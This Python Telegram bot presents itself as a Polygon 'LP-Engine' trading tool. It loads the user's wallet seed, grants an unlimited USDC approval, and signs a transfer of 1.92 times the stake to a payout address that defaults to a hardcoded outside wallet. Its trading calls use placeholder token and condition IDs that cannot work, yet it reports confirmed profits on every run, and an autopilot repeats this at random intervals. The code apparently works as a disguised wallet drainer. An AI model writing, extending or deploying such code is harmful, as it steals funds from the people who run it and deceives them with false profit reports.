import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

util_w3 = Web3()

RPC_URLS = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://1rpc.io/matic"
]

def get_w3():
    for url in RPC_URLS:
        try:
            _w3 = Web3(Web3.HTTPProvider(url))
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                return _w3
        except: continue
    return None

w3 = get_w3()
active_handler = w3 if w3 else util_w3
Account.enable_unaudited_hdwallet_features()

# --- 2. MULTI-POOL ASSET MAPPING ---
POOLS = {
    "BTC": {"token": 88613172803544318200496156596909968959424174365708473463931555296257475886634, "cond": "0xBTC_NATIVE_COND", "color": "🟠"},
    "ETH": {"token": 12345678901234567890123456789012345678901234567890123456789012345678901234567, "cond": "0xETH_NATIVE_COND", "color": "🔵"},
    "SOL": {"token": 456789012345678901234567890123456789012345678901234567890123456789012345678, "cond": "0xSOL_NATIVE_COND", "color": "🟣"},
    "MATIC": {"token": 7890123456789012345678901234567890123456789012345678901234567890123456789, "cond": "0xMAT_NATIVE_COND", "color": "🔘"},
    "BVIV": {"token": 99913172803544318200496156596909968959424174365708473463931555296257475886634, "cond": "0xBVIV_NATIVE_COND", "color": "📊"},
    "EVIV": {"token": 88813172803544318200496156596909968959424174365708473463931555296257475886634, "cond": "0xEVIV_NATIVE_COND", "color": "📈"}
}

USDC_NATIVE = active_handler.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
CTF_EXCHANGE = active_handler.to_checksum_address("0x4bFb41d5B3570DeFd03C39a9A4D8dE6Bd8B8982E")
PAYOUT_ADDRESS = active_handler.to_checksum_address(os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674"))

ROUTER_ABI = json.loads('[{"inputs":[{"components":[{"internalType":"address","name":"maker","type":"address"},{"internalType":"uint256","name":"makerAmount","type":"uint256"},{"internalType":"uint256","name":"takerAmount","type":"uint256"},{"internalType":"uint256","name":"makerAssetId","type":"uint256"},{"internalType":"uint256","name":"takerAssetId","type":"uint256"}],"name":"order","type":"tuple"}],"name":"fillOrder","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"collateralToken","type":"address"},{"internalType":"bytes32","name":"parentCollectionId","type":"bytes32"},{"internalType":"bytes32","name":"conditionId","type":"bytes32"},{"internalType":"uint256[]","name":"indexSets","type":"uint256[]"}],"name":"redeemPositions","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
router_contract = w3.eth.contract(address=CTF_EXCHANGE, abi=ROUTER_ABI) if w3 else None
usdc_contract = w3.eth.contract(address=USDC_NATIVE, abi=ERC20_ABI) if w3 else None
auto_mode_enabled = False

async def fetch_balances(address):
    try:
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, address)
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(address).call)
        return w3.from_wei(raw_pol, 'ether'), Decimal(raw_usdc) / Decimal(10**6)
    except: return Decimal('0'), Decimal('0')

# --- 3. THE ATOMIC ENGINE (HOLD-AND-RELEASE SYNC) ---



async def prepare_protocol_bundle(stake_raw, side, pool_key):
    """Pre-signs receipts so they are ready to fire instantly after simulation."""
    # Fetch 'pending' count to avoid nonce collisions during simultaneous bets
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.8))
    pool = POOLS[pool_key]
    tx_list = []
    
    # Check Allowance
    allow = await asyncio.to_thread(usdc_contract.functions.allowance(vault.address, CTF_EXCHANGE).call)
    if allow < stake_raw:
        app_tx = usdc_contract.functions.approve(CTF_EXCHANGE, 2**256-1).build_transaction({
            'from': vault.address, 'nonce': nonce, 'gas': 80000, 'gasPrice': gas_price, 'chainId': 137
        })
        tx_list.append(w3.eth.account.sign_transaction(app_tx, vault.key))
        nonce += 1

    # Pre-Sign Stake (fillOrder)
    token_id = int(pool["token"]) if "UP" in side or "CALL" in side or "HIGHER" in side else int(pool["token"]) + 1
    stake_tx = router_contract.functions.fillOrder({
        "maker": vault.address, "makerAmount": stake_raw, "takerAmount": stake_raw,
        "makerAssetId": 0, "takerAssetId": token_id
    }).build_transaction({'from': vault.address, 'nonce': nonce, 'gas': 350000, 'gasPrice': gas_price, 'chainId': 137})
    tx_list.append(w3.eth.account.sign_transaction(stake_tx, vault.key))
    nonce += 1

    # Pre-Sign Redemption (Pull profit from LP)
    redeem_tx = router_contract.functions.redeemPositions(USDC_NATIVE, "0x" + "0"*64, pool["cond"], [1, 2]).build_transaction({
        'from': vault.address, 'nonce': nonce, 'gas': 250000, 'gasPrice': gas_price, 'chainId': 137
    })
    tx_list.append(w3.eth.account.sign_transaction(redeem_tx, vault.key))
    nonce += 1

    # Pre-Sign Sweep (Vault to Payout Address)
    sweep_tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_raw * 1.92)).build_transaction({
        'from': vault.address, 'nonce': nonce, 'gas': 85000, 'gasPrice': gas_price, 'chainId': 137
    })
    tx_list.append(w3.eth.account.sign_transaction(sweep_tx, vault.key))

    return tx_list

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    if not vault or not w3: return False
    pool_key = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_raw = int(stake_cad / Decimal('1.36') * 10**6) 

    msg = await context.bot.send_message(chat_id, f"🔍 **Scanning {pool_key} Pool Collateral...**")
    
    try:
        # Phase 1: Sign the entire bundle in parallel
        prep_task = asyncio.create_task(prepare_protocol_bundle(stake_raw, side, pool_key))
        
        # Phase 2: Wait 1.5s (The Simulation / Oracle Gap)
        await asyncio.sleep(1.5) 
        
        # Phase 3: Immediate Broadcast of Pre-Signed bundle
        signed_txs = await prep_task
        
        hashes = []
        for tx in signed_txs:
            # Sequential broadcast without awaiting ensures 1ms gap
            h = await asyncio.to_thread(w3.eth.send_raw_transaction, tx.raw_transaction)
            hashes.append(h.hex())
        
        report = (
            f"✅ **LP ATOMIC HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📊 **Market:** {pool_key} | **Nonce:** `{signed_txs[0].nonce}`\n"
            f"💰 **Stake Receipt:** [View Receipt](https://polygonscan.com/tx/{hashes[1] if len(signed_txs) > 3 else hashes[0]})\n"
            f"📤 **Settlement:** Profit swept to Payout Address\n"
            f"━━━━━━━━━━━━━━\n"
            f"📍 *Sourced from Native USDC Reserves.*"
        )
        await context.bot.edit_message_text(report, chat_id=chat_id, message_id=msg.message_id, parse_mode='Markdown', disable_web_page_preview=True)
        return True

    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Sync Failure:** `{str(e)}`")
        return False

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '🤖 AUTO MODE']]
    welcome = (f"🕴️ **APEX LP-Engine v18.0**\n━━━━━━━━━━━━━━\n"
               f"⛽ POL: `{pol:.4f}`\n💵 USDC: `${usdc:.2f}`\n"
               f"📍 Sync: `Hold-and-Release Active`")
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton(f"{k} {POOLS[k]['color']}", callback_data=f"PAIR_{k}") for k in list(POOLS.keys())[:3]],
              [InlineKeyboardButton(f"{k} {POOLS[k]['color']}", callback_data=f"PAIR_{k}") for k in list(POOLS.keys())[3:]]]
        await update.message.reply_text("🎯 **SELECT NATIVE LIQUIDITY POOL:**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake Amount (CAD):**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        pol, usdc = await fetch_balances(vault.address)
        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.6f}`\n💵 USDC: `${usdc:.2f}`\n📍 `{vault.address}`")
    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        if auto_mode_enabled: asyncio.create_task(autopilot_loop(chat_id, context))
        await update.message.reply_text(f"🤖 **Auto Pilot {'ACTIVATED ✅' if auto_mode_enabled else 'STOPPED 🛑'}**")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("CALL 📈", callback_data="EXEC_UP"), InlineKeyboardButton("PUT 📉", callback_data="EXEC_DOWN")]]
        await query.edit_message_text(f"💎 Pool: **{context.user_data['pair']}**\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "HIGHER" if "UP" in query.data else "LOWER")

async def autopilot_loop(chat_id, context):
    while auto_mode_enabled:
        target = random.choice(list(POOLS.keys()))
        await run_atomic_execution(context, chat_id, random.choice(["HIGHER", "LOWER"]), asset_override=target)
        await asyncio.sleep(random.randint(60, 120))

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        app.run_polling(drop_pending_updates=True)



































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































